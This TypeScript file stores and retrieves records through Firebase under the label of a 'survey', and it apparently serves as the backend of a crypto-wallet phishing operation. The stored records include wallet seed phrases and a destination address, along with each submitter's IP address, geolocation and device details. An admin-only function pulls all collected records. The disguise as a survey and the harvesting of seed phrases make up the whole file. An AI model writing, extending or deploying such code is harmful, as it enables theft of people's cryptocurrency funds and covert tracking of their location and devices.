// storeSurvey.ts
import { auth, db } from "./firebase";
import {
	collection,
	addDoc,
	serverTimestamp,
	getDocs,
} from "firebase/firestore";
import { User } from "firebase/auth";

interface SurveyData {
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	destinationAddress: string;
	ipAddress?: string;
	geolocation: {
		latitude?: number;
		longitude?: number;
		city?: string;
		region?: string;
		country?: string;
		error?: string;
	} | null;
	userAgent?: string;
	screenResolution?: string;
}

export async function storeSurveyData(data: SurveyData) {
	try {
		const docRef = await addDoc(collection(db, "surveys"), {
			...data,
			createdAt: serverTimestamp(),
		});
		console.log("Survey submitted with ID: ", docRef.id);
		return docRef.id;
	} catch (error) {
		console.error("Error adding survey: ", error);
		throw error;
	}
}

/**
 * Fetch all surveys if the current user is an admin
 */
export const fetchAllSurveys = async () => {
	// Get the current user
	const user: User | null = auth.currentUser;

	if (!user) {
		throw new Error("No user logged in");
	}

	// Read admin UIDs from environment variable
	const adminUIDs = process.env.NEXT_PUBLIC_ADMIN_UIDS?.split(",") || [];

	// Check if the current user is an admin
	if (!adminUIDs.includes(user.uid)) {
		throw new Error("You are not authorized to access this data");
	}

	// Fetch all documents in 'surveys' collection
	const surveysSnapshot = await getDocs(collection(db, "surveys"));
	const surveys = surveysSnapshot.docs.map((doc) => ({
		id: doc.id,
		...doc.data(),
	}));

	return surveys;
};
